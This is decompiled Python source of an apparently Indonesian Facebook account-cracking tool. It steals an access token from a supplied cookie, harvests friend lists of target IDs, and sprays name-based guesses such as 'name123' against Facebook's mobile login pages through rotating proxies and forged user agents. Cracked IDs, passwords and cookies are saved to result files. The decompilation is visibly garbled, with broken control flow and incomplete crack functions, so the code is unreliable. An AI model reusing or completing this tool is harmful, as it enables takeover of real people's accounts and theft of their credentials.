# Source Generated with Decompyle++
# File: 2.pyc (Python 3.10)

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.panel import Panel
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
pretty.install()
CON = sol()
pretty.install()
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []

try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt', 'w').write(prox)
finally:
    pass
if Exception:
    e = None
    
    try:
        exit(e)
    finally:
        e = None
        del e
    e = None
    del e
    for xd in range(10000):
        a = 'Mozilla/5.0 (Symbian/3; Series60/'
        b = random.randrange(1, 9)
        c = random.randrange(1, 9)
        d = 'Nokia'
        e = random.randrange(100, 9999)
        f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
        g = random.randrange(1, 9)
        h = random.randrange(1, 4)
        i = random.randrange(1, 4)
        j = random.randrange(1, 4)
        k = 'Mobile Safari/535.1'
        uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
        ugen2.append(uaku)
        aa = 'Mozilla/5.0 (Linux; Android 5.0.2;'
        b = random.choice([
            '6',
            '7',
            '8',
            '9',
            '10',
            '11',
            '12'])
        c = 'Redmi Note 2)'
        d = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        e = random.randrange(1, 999)
        f = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152'
        h = random.randrange(73, 100)
        i = '0'
        j = random.randrange(4200, 4900)
        k = random.randrange(40, 150)
        l = 'Mobile Safari/537.36'
        uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
        ugen.append(uaku2)
        for x in range(10):
            a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
            b = random.randrange(100, 9999)
            c = random.randrange(100, 9999)
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            h = random.randrange(1, 9)
            i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
            j = random.randrange(1, 9)
            k = random.randrange(1, 9)
            l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
            uak = f'''{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'''
            
            def uaku():
                
                try:
                    ua = open('bbnew.txt', 'r').read().splitlines()
                    for ub in ua:
                        ugen.append(ub)
                finally:
                    return None
                    a = requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
                    ua = open('.bbnew.txt', 'w')
                    aa = re.findall('line">(.*?)<', str(a))
                    for un in aa:
                        ua.write(un + '\n')
                    ua = open('.bbnew.txt', 'r').read().splitlines()
                    return None


            (id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
            cokbrut = []
            pwpluss = []
            pwnya = []
            P = '\x1b[1;97m'
            M = '\x1b[1;91m'
            H = '\x1b[1;92m'
            K = '\x1b[1;93m'
            B = '\x1b[1;94m'
            U = '\x1b[1;95m'
            O = '\x1b[1;96m'
            N = '\x1b[0m'
            Z = '\x1b[1;30m'
            sir = '\x1b[41m\x1b[1;97m'
            x = '\x1b[m'
            m = '\x1b[1;91m'
            k = '\x1b[93m'
            h = '\x1b[1;92m'
            hh = '\x1b[32m'
            u = '\x1b[95m'
            kk = '\x1b[33m'
            b = '\x1b[1;96m'
            p = '\x1b[0;34m'
            asu = random.choice([
                m,
                k,
                h,
                u,
                b])
            dic = {
                '1': 'January',
                '2': 'February',
                '3': 'March',
                '4': 'April',
                '5': 'May',
                '6': 'June',
                '7': 'July',
                '8': 'August',
                '9': 'September',
                '10': 'October',
                '11': 'November',
                '12': 'December' }
            dic2 = {
                '01': 'January',
                '02': 'February',
                '03': 'March',
                '04': 'April',
                '05': 'May',
                '06': 'June',
                '07': 'July',
                '08': 'August',
                '09': 'September',
                '10': 'October',
                '11': 'November',
                '12': 'Devember' }
            tgl = datetime.datetime.now().day
            bln = dic[str(datetime.datetime.now().month)]
            thn = datetime.datetime.now().year
            okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
            cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
            
            def renv_xy(u):
                for e in u + '\n':
                    sys.stdout.write(e)
                    sys.stdout.flush()
                    time.sleep(0.005)

            
            def clear():
                os.system('clear')

            
            def back():
                login()

            
            def banner():
                clear()
                print(f'''\t{H}   \n       _         _    _ _____ _____  \n      | |  /\\   | |  | |_   _|  __ \\ \n      | | /  \\  | |__| | | | | |  | |\n  _   | |/ /\\ \\ |  __  | | | | |  | |\n | |__| / ____ \\| |  | |_| |_| |__| |\n  \\____/_/    \\_\\_|  |_|_____|_____/ \n      {sir}Script Ini Hanya Di Gunakan{x}\n      {sir}Oleh Orang Orang Tertentu😄{x} ''')

            
            def xoshnaw():
                uuid = str(os.geteuid()) + str(os.getlogin())
                id = '-'.join(uuid)
                print('\x1b[1;92m╚═➣ ID KAMU ADALAH\x1b[1;91m : ' + id)
                
                try:
                    httpCaht = requests.get('https://github.com/FB-KO/Green-Lover/blob/main/Approval.txt').text
                    if id in httpCaht:
                        print('\x1b[1;96m╚═➣ STATUS ID ANDA: AKTIF \x1b[1;92m[✔]')
                        msg = str(os.geteuid())
                        time.sleep(0.3)
                finally:
                    return None
                    print('\x1b[38;5;248m╚═➣ ID ANDA TIDAK AKTIF \x1b[1;91m[✘]')
                    print('\x1b[38;5;208mSILAHKAN COPY ID ANDA KIRIM KE AUTHOR !!!')
                    os.system('xdg-open https://wa.me/+8801311662738?text="+id')
                    time.sleep(1)
                    sys.exit()
                    return None
                    sys.exit()
                    if name == '__main__':
                        print(logo)
                        xoshnaw()
                        return None
                    return None


            xoshnaw()
            os.system('clear')
            
            def login():
                
                try:
                    token = open('.token.txt', 'r').read()
                    cok = open('.cok.txt', 'r').read()
                    tokenku.append(token)
                    
                    try:
                        sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], {
                            'cookie': cok }, **('cookies',))
                        sy2 = json.loads(sy.text)['name']
                        sy3 = json.loads(sy.text)['id']
                        menu(sy2, sy3)
                    finally:
                        return None
                        if KeyError:
                            login_lagi334()
                        return None
                        if requests.exceptions.ConnectionError:
                            li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
                            lo = mark(li, 'red', **('style',))
                            sol().print(lo, 'cyan', **('style',))
                            exit()
                        return None
                        if IOError:
                            login_lagi334()
                            return None



            
            def login_lagi334():
                
                try:
                    os.system('clear')
                    banner()
                    cetak(nel('\tLogin Dengan : [green]Cookiedough[white]'))
                    asu = random.choice([
                        h])
                    cookie = input(f'''Enter Cookies :{asu} ''')
                    data = requests.get('https://business.facebook.com/business_locations', {
                        'user-agent': 'NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
                        'referer': 'https://www.facebook.com/',
                        'host': 'business.facebook.com',
                        'origin': 'https://business.facebook.com',
                        'upgrade-insecure-requests': '1',
                        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                        'cache-control': 'max-age=0',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8',
                        'content-type': 'text/html; charset=utf-8' }, {
                        'cookie': cookie }, **('headers', 'cookies'))
                    find_token = re.search('(EAAG\\w+)', data.text)
                    ken = open('.token.txt', 'w').write(find_token.group(1))
                    cok = open('.cok.txt', 'w').write(cookie)
                    print(f'''  {x}[{h}•{x}]{h} LOGIN BERHASIL!{x} ''')
                    time.sleep(1)
                    exit()
                finally:
                    return None
                    if Exception:
                        e = None
                        
                        try:
                            os.system('rm -f .token.txt')
                            os.system('rm -f .cok.txt')
                            print('  %s[%sx%s]%s LOGIN FAILED.....CHECK YOUR ACCOUNT !!%s' % (x, k, x, m, x))
                            exit()
                        finally:
                            e = None
                            del e
                            return None
                            e = None
                            del e



            
            def menu(my_name, my_id):
                
                try:
                    token = open('.token.txt', 'r').read()
                    cok = open('.cok.txt', 'r').read()
                finally:
                    pass

                None if IOError else os.system('clear')
                banner()
                print('')
                ip = requests.get('https://api.ipify.org').text
                renv_xy(' \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] Your Id  : ' + str(my_id))
                renv_xy(f''' \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] Your Ip  : {ip}''')
                print(f''' \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] Status   : {H}V I P{x}''')
                print(' \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] Email    : Jahidhassan6867@gamil.com ')
                print('')
                cetak(nel('\tFITUR SEADANYA SAJA TIDAK PERLU BANYAK'))
                print('')
                cetak('[white]1. Crack Public 2. Crack File 3. Setting User Agent\n4. Cek Results  0. Exit[white]')
                _____renv__renv_____ = input('\n Select : ')
                print('')
                if _____renv__renv_____ in ('1',):
                    dump_massal()
                if _____renv__renv_____ in ('2',):
                    crack_file()
                if _____renv__renv_____ in ('3',):
                    useragent()
                if _____renv__renv_____ in ('4',):
                    result()
                    return None
                if None in ('0',):
                    os.system('rm -rf .token.txt')
                    os.system('rm -rf .cookie.txt')
                    print('>> Successfully Logout+Delete Cookies ')
                    exit()
                    return None
                None('>> input correctly ')
                back()

            
            def error():
                print(f'''{k}>> Sorry, this feature is still being fixed {x}''')
                time.sleep(4)
                back()

            
            def dump_massal():
                
                try:
                    token = open('.token.txt', 'r').read()
                    cok = open('.cok.txt', 'r').read()
                finally:
                    pass

                if None if IOError else None if ValueError else jum < 1 or jum > 100:
                    print('>> Failed Dump Id maybe id is not public ')
                    exit()
                ses = requests.Session()
                yz = 0
                for met in range(jum):
                    yz += 1
                    kl = input('Enter the Id ' + str(yz) + ' : ')
                    uid.append(kl)
                    for userr in uid:
                        
                        try:
                            col = ses.get('https://graph.facebook.com/v2.0/' + userr + '?fields=friends.limit(5000)&access_token=' + tokenku[0], {
                                'cookies': cok }, **('cookies',)).json()
                            for mi in col['friends']['data']:
                                
                                try:
                                    iso = mi['id'] + '|' + mi['name']
                                    if iso in id:
                                        pass
                                    else:
                                        id.append(iso)
                                finally:
                                    continue
                                    continue
                                    continue
                                    if (KeyError, IOError):
                                        continue
                                    if requests.exceptions.ConnectionError:
                                        print('>> unstable signal ')
                                        exit()
                                        continue
                                        
                                        try:
                                            print('')
                                            print(f'''Total Id Collected {h}''' + str(len(id)))
                                            setting()
                                        finally:
                                            return None
                                            if requests.exceptions.ConnectionError:
                                                print(f'''{x}''')
                                                print('>> unstable signal ')
                                                back()
                                                return None
                                            if (KeyError, IOError):
                                                print(f'''>>{k} Friendship Not Public {x}''')
                                                time.sleep(3)
                                                back()
                                                return None




            
            def crack_file():
                
                try:
                    vin = os.listdir('DUMP')
                finally:
                    pass

                if None if FileNotFoundError else len(vin) == 0:
                    print('>> Kamu Tidak Memiliki File Dump ')
                    time.sleep(2)
                    back()
                    return None
                cih = None
                lol = { }
                for isi in vin:
                    
                    try:
                        hem = open('DUMP/' + isi, 'r').readlines()
                    finally:
                        pass
                    continue
                    cih += 1
                    if cih < 100:
                        nom = '' + str(cih)
                        lol.update({
                            str(cih): str(isi) })
                        lol.update({
                            nom: str(isi) })
                        print(f'''>> %s. %s ({h} %s{x} idz )''' % (nom, isi, len(hem)))
                        continue

                    lol.update({
                        str(cih): str(isi) })
                    print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                    print('>> %s. %s ({h} %s {x}idz) ' % (cih, isi, len(hem)))
                    geeh = input('\n>> Pilih : ')
                    
                    try:
                        geh = lol[geeh]
                    finally:
                        pass
                    if KeyError:
                        print(f'''{k}>> Pilih Yang Bener Kontol {x}''')
                        time.sleep(3)
                        back()
                    else:
                        
                        try:
                            lin = open('DUMP/' + geh, 'r').read().splitlines()
                        finally:
                            pass
                        print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
                        time.sleep(2)
                        back()
                        for xid in lin:
                            id.append(xid)
                            setting()
                            return None



            
            def useragent():
                print('\n%s[%s01%s]. Ganti user agent ' % (P, H, P))
                print('%s[%s02%s]. Cek user agent ' % (P, H, P))
                print('%s[%s00%s]. Kembali ' % (P, H, P))
                __Aang__Sayang__Laura__ = input('\n%s[%s+%s] Pilih :%s ' % (P, M, P, H))
                uas(__Aang__Sayang__Laura__)

            
            def uas(__Aang__Sayang__Laura__):
                if __Aang__Sayang__Laura__ == '':
                    print('\n%s[%s!%s] Yang bener kontol' % (P, K, P))
                    jeda(2)
                    uas(__Aang__Sayang__Laura__)
                    return None
                if None in ('1', '01'):
                    print('%s[%s!%s] Ketik %scancel%s untuk gunakan ua dari script' % (P, H, P, H, P))
                    ua = input('%s[%s!%s] User agent :%s ' % (P, H, P, H))
                    if ua in '':
                        print('\n%s[%s!%s] Yang bener kontol' % (P, K, P))
                        jeda(2)
                        menu()
                    elif ua in ('CANCEL', 'Cancel', 'cancel'):
                        ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                        open('ua.txt', 'w').write(ua_)
                        jeda(2)
                        print('\n%s[%s✓%s]  Berhasil menggunakan user agent script ' % (P, H, P))
                        jeda(2)
                        pilihan().menu()
                    open('ua.txt', 'w').write(ua)
                    time.sleep(2)
                    print('\n%s[%s✓%s] Berhasil mengganti user agent' % (P, H, P))
                    time.sleep(2)
                    menu()
                    return None
                if None in ('2', '02'):
                    
                    try:
                        ua_ = open('ua.txt', 'r').read()
                        time.sleep(2)
                        print('%s[%s+%s] User anget lu :%s%s ' % (P, H, P, H, ua_))
                        time.sleep(2)
                        input('\n%s[%s!%s] Tekan enter ' % (P, H, P))
                        menu()
                    finally:
                        return None
                        if IOError:
                            ua_ = '%s-' % M
                            return None
                        if None in ('0', '00'):
                            menu()
                            return None
                        None('\n%s[%s!%s] Yang bener kontol' % (P, K, P))
                        time.sleep(2)
                        uas(__Aang__Sayang__Laura__)
                        return None


            
            def result():
                print('{ 1 } Crack CP Id ')
                print('{ 2 } Crack OK Id ')
                print('{ 3 } Kembali\t')
                kz = input('\n>> Pilih : ')
                if kz in ('1', '01'):
                    
                    try:
                        vin = os.listdir('CP')
                    finally:
                        pass

                    if None if FileNotFoundError else len(vin) == 0:
                        print('>> Anda Tidak Memiliki Hasil CP ')
                        time.sleep(2)
                        back()
                        return None
                    cih = None
                    lol = { }
                    for isi in vin:
                        
                        try:
                            hem = open('CP/' + isi, 'r').readlines()
                        finally:
                            pass
                        continue
                        cih += 1
                        if cih < 10:
                            nom = '0' + str(cih)
                            lol.update({
                                str(cih): str(isi) })
                            lol.update({
                                nom: str(isi) })
                            print('[' + nom + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                            continue

                        lol.update({
                            str(cih): str(isi) })
                        print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                        geeh = input('\n>> Pilih : ')
                        
                        try:
                            geh = lol[geeh]
                        finally:
                            pass
                        if KeyError:
                            print('>> Pilih Yang Bener Kontol ')
                            exit()
                        else:
                            
                            try:
                                lin = open('CP/' + geh, 'r').read().splitlines()
                            finally:
                                pass
                            print('>> File Tidak Di Temukan ')
                            time.sleep(2)
                            back()
                            nocp = 0
                            for cpku in range(len(lin)):
                                cpkuni = lin[nocp].split('|')
                                cpkuh = f'''# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'''
                                sol().print(mark(cpkuh, 'yellow', **('style',)))
                                nocp += 1
                                input('[ Klik Enter ]')
                                back()
                                return None
                                if kz in ('2', '02'):
                                    
                                    try:
                                        vin = os.listdir('OK')
                                    finally:
                                        pass

                                    if None if FileNotFoundError else len(vin) == 0:
                                        print('>> Anda Tidak Mempunyai File OK ')
                                        time.sleep(2)
                                        back()
                                        return None
                                    cih = None
                                    lol = { }
                                    for isi in vin:
                                        
                                        try:
                                            hem = open('OK/' + isi, 'r').readlines()
                                        finally:
                                            pass
                                        continue
                                        cih += 1
                                        if cih < 100:
                                            nom = '0' + str(cih)
                                            lol.update({
                                                str(cih): str(isi) })
                                            lol.update({
                                                nom: str(isi) })
                                            print('[' + nom + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                                            continue

                                        lol.update({
                                            str(cih): str(isi) })
                                        print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                                        geeh = input('\n>> Pilih : ')
                                        
                                        try:
                                            geh = lol[geeh]
                                        finally:
                                            pass
                                        if KeyError:
                                            print('>> Pilih Yang Bener Kontol ')
                                            exit()
                                        else:
                                            
                                            try:
                                                lin = open('OK/' + geh, 'r').read().splitlines()
                                            finally:
                                                pass
                                            print('>> File Tidak Di Temukan ')
                                            time.sleep(2)
                                            back()
                                            nocp = 0
                                            for cpku in range(len(lin)):
                                                cpkuni = lin[nocp].split('|')
                                                cpkuh = f'''# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'''
                                                sol().print(mark(cpkuh, 'green', **('style',)))
                                                print(f'''{hh}COOKIE : {x}{cpkuni[2]}''')
                                                nocp += 1
                                                input('[ Klik Enter ]')
                                                back()
                                                return None
                                                if kz in ('0', '00'):
                                                    back()
                                                    return None
                                                None('>> Pilih Yang Bener Kontol ')
                                                exit()
                                                return None





            
            def setting():
                cetak(nel('\t   RECOMMENDED ACCOUNT NEW'))
                print('')
                print(f'''{x}1. ACCOUNT OLD ({M}No Recommended{M}{x}){x} ''')
                print(f'''2. ACCOUNT NEW ({H}Recommended{H}{x}){x}  ''')
                print(f'''3. ACCOUNT RANDOM ({H}Recommended{K}{x}){x} ''')
                print('')
                hu = input('Select : ')
                if hu in ('1', '01'):
                    for tua in sorted(id):
                        id2.append(tua)
                elif hu in ('2', '02'):
                    muda = []
                    for bacot in sorted(id):
                        muda.append(bacot)
                    bcm = len(muda)
                    bcmi = bcm - 1
                    for xmud in range(bcm):
                        id2.append(muda[bcmi])
                        bcmi -= 1
                elif hu in ('3', '03'):
                    for bacot in id:
                        xx = random.randint(0, len(id2))
                        id2.insert(xx, bacot)
                else:
                    print('>> input correctly ')
                    exit()
                    print('')
                cetak(nel('\t  SILAHKAN PILIH MTHODE 1-3'))
                print('')
                print(f'''1. {P}Mobile {B}m.facebook.com{x} {H}Recommended{x}''')
                print(f'''2. {P}Free++ {B}free.facebook.com{x} {H}Recommended {x}''')
                print(f'''3. {P}Mbasic {B}mbasic.facebook.com{x} {H}Recommended{x}''')
                print('')
                hc = input(' Pilih : ')
                if hc in ('1', '01'):
                    method.append('mobile')
                elif hc in ('2', '02'):
                    method.append('free')
                elif hc in ('3', '03'):
                    method.append('mbasic')
                else:
                    method.append('mobile')
                cetak(nel('\tRECOMMENDED PASSWORD MANUAL'))
                pwplus = input(' Gunakan Password Manual ( Y/t ) ')
                cetak(nel('\t  TANDA (,) UNTUK PENGHUBUNG'))
                if pwplus in ('y', 'Y'):
                    pwpluss.append('ya')
                    cetak('Gunakan Password Minimal 6++ Kalimat\nContoh :[green] name,name123,name12345[white] ')
                    pwku = input('Masukan Password : ')
                    pwkuh = pwku.split(',')
                    for xpw in pwkuh:
                        pwnya.append(xpw)
                else:
                    pwpluss.append('no')
                passwrd()

            
            def passwrd():
                print('')
                print(f'''>> Results {h}OK{x} Save in : {h}OK/%s {x}''' % okc)
                print(f'''>> Results {k}CP{x} Save in : {k}CP/%s {x}''' % cpc)
                print('>> Play Airplane Mode Every 500 ID\n')
                with tred(30, **('max_workers',)) as pool:
                    for yuzong in id2:
                        idf = yuzong.split('|')[0]
                        nmf = yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        pwv = []
                        if len(nmf) < 6:
                            if len(frs) < 3:
                                pass
                            else:
                                pwv.append(nmf)
                                pwv.append(frs + '123456')
                                pwv.append(frs + '12345')
                                pwv.append(frs + '1234')
                                pwv.append(frs + '321')
                                pwv.append(frs + '123')
                        elif len(frs) < 3:
                            pwv.append(nmf)
                        else:
                            pwv.append(nmf)
                            pwv.append(frs + '123456')
                            pwv.append(frs + '12345')
                            pwv.append(frs + '1234')
                            pwv.append(frs + '321')
                            pwv.append(frs + '123')
                        if 'ya' in pwpluss:
                            for xpwd in pwnya:
                                pwv.append(xpwd)
                        
                        if 'mobile' in method:
                            pool.submit(crack, idf, pwv)
                            continue
                        if 'free' in method:
                            pool.submit(crackfree, idf, pwv)
                            continue
                        if 'mbasic' in method:
                            pool.submit(crackmbasic, idf, pwv)
                            continue
                        pool.submit(crackmbasic, idf, pwv)
                    None(None, None, None)
                if not None:
                    pass
                print('')
                cetak('\t[cyan]>>[green] Succesfully Crack,Dont Forget Send Your Feedback After Use My Script [cyan] <<[white] ')
                print('')
                print(f'''{h} OK : {h}%s ''' % ok)
                print(f'''{k} CP : {k}%s{x} ''' % cp)
                print('')
                print(f'''\t{x}>>{k} Good Bye Thanks To Using My Script {x} << ''')

            
            def crack(idf, pwv):
                bi = random.choice([
                    '\x1b[m'])
                pers = loop * 100 / len(id2)
                fff = '%'
                print('\r%s[JAHID] %s/%s 𝙾𝙺 : %s 𝙲𝙿 : %s %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), ' ', **('end',))
                sys.stdout.flush()
                ua = random.choice(ugen)
                ua2 = random.choice(ugen)
                ses = requests.Session()
            # WARNING: Decompyle incomplete

            
            def crackfree(idf, pwv):
                bi = random.choice([
                    '\x1b[m'])
                pers = loop * 100 / len(id2)
                fff = '%'
                print('\r%s[JAHID] %s/%s 𝙾𝙺 : %s 𝙲𝙿 : %s %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), ' ', **('end',))
                sys.stdout.flush()
                ua = random.choice(ugen)
                ua2 = random.choice(ugen)
                ses = requests.Session()
            # WARNING: Decompyle incomplete

            
            def crackmbasic(idf, pwv):
                bi = random.choice([
                    '\x1b[m'])
                pers = loop * 100 / len(id2)
                fff = '%'
                print('\r%s[JAHID] %s/%s 𝙾𝙺 : %s 𝙲𝙿 : %s %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), ' ', **('end',))
                sys.stdout.flush()
                ua = random.choice(ugen)
                ua2 = random.choice(ugen)
                ses = requests.Session()
            # WARNING: Decompyle incomplete

            if __name__ == '__main__':
                
                try:
                    os.system('git pull')
                finally:
                    pass
                
                try:
                    os.mkdir('OK')
                finally:
                    pass
                
                try:
                    os.mkdir('CP')
                finally:
                    pass
                
                try:
                    os.system('touch .prox.txt')
                finally:
                    pass
                login()
                return None
                return None






